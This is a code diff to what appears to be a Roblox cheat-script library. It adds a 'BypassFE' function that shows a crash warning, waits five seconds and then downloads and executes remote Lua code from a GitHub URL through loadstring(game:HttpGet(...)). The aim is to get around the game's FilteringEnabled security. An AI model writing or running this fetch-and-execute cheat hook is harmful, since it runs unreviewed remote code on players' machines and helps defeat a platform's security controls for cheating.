@@ -178,6 +178,31 @@ function Library:ToggleFly(speed)
 	ToggleFlyInternal(speed)
 end
 
+function Library:BypassFE()
+	warn("WARNING: BYPASSING FE IN 5 SEC, THIS MAY CRASH YOUR GAME OR FREEZE IT FOR A WHILE!")
+	local StarterGui = game:GetService("StarterGui")
+    local success
+
+    for i = 1, 5 do
+        success = pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = string.format("[%s] !!WARNING!!", self.Name),
+                Text = "BYPSSING FE IN 5 SEC, THIS MAY CRASH YOUR GAME OR FREEZE IT FOR A WHILE!",
+				Icon = "rbxassetid://6525485108",
+                Duration = 10
+            })
+        end)
+        if success then break end
+        task.wait(0.5)
+    end
+
+    if not success then
+        warn("Notification failed after retries")
+    end
+	wait(5)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/OnyxLunar/Roblox-FE-Bypasser/refs/heads/main/febypass.lua"))()
+end
+
 return function(name)
     return Library.new(name)
 end
